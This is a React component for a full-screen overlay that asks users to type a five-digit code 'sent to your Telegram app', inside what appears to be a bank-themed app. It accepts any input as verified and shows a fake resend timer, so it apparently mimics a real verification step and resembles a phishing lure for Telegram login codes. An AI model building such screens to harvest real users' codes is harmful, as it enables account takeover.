
import React, { useState, useRef } from 'react';
import { TelegramIcon } from './ScotiaIcons';

interface TelegramOTPProps {
  onVerify: () => void;
  title?: string;
}

const TelegramOTP: React.FC<TelegramOTPProps> = ({ onVerify, title = "Security Verification" }) => {
  const [code, setCode] = useState(['', '', '', '', '']);
  const inputs = useRef<HTMLInputElement[]>([]);

  const handleChange = (index: number, val: string) => {
    if (!/^\d*$/.test(val)) return;
    const newCode = [...code];
    newCode[index] = val.slice(-1);
    setCode(newCode);

    if (val && index < 4) {
      inputs.current[index + 1]?.focus();
    }
    
    if (newCode.every(v => v !== '')) {
      setTimeout(onVerify, 600);
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputs.current[index - 1]?.focus();
    }
  };

  return (
    <div className="absolute inset-0 z-[1000] bg-black/90 backdrop-blur-3xl flex flex-col items-center justify-center p-8 animate-in fade-in">
      <div className="bg-[#121212] w-full max-w-[340px] p-10 rounded-[40px] border border-white/10 shadow-3xl text-center">
        <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mx-auto mb-8 shadow-2xl">
          <TelegramIcon size={44} />
        </div>
        <h2 className="text-white text-2xl font-black mb-2 tracking-tight">{title}</h2>
        <p className="text-white/40 text-sm mb-12 leading-relaxed">
          We've sent a code to your <span className="text-[#0088cc] font-bold">Telegram</span> app. Please enter it below.
        </p>

        <div className="flex gap-3 justify-center mb-10">
          {code.map((digit, i) => (
            <input
              key={i}
              // Fix: Ref callback now correctly assigns the element.
              ref={el => { inputs.current[i] = el as HTMLInputElement; }}
              type="text"
              inputMode="numeric"
              value={digit}
              onChange={e => handleChange(i, e.target.value)}
              onKeyDown={e => handleKeyDown(i, e)}
              className="w-12 h-16 bg-white/5 border border-white/10 rounded-2xl text-center text-white text-3xl font-black focus:border-[#0088cc] focus:bg-white/10 outline-none transition-all"
            />
          ))}
        </div>

        <button className="text-[#0088cc] font-bold text-xs uppercase tracking-[0.2em] opacity-50">
          Resend code in 0:54
        </button>
      </div>
    </div>
  );
};

export default TelegramOTP;
